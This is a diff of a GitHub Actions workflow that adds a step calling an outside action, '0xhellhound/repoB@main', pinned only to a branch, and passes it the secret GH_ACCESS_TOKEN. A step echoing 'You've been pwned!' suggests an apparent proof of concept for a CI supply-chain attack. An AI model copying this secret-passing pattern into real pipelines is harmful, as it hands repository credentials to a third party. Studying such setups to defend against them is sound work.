@@ -1,5 +1,4 @@
-name: Run Intermediate Action from Repo B during CI
-
+name: CI Workflow
 on:
   push:
     branches:
@@ -9,8 +8,13 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Use Intermediate Action
+      - name: Checkout RepoA
+        uses: actions/checkout@v3
+
+      - name: Use RepoB Action
         uses: 0xhellhound/repoB@main
+        with:
+          token: ${{ secrets.GH_ACCESS_TOKEN }}
 
       - name: Dummy Step
-        run: echo "you've been pwned"
+        run: echo "You've been pwned!"
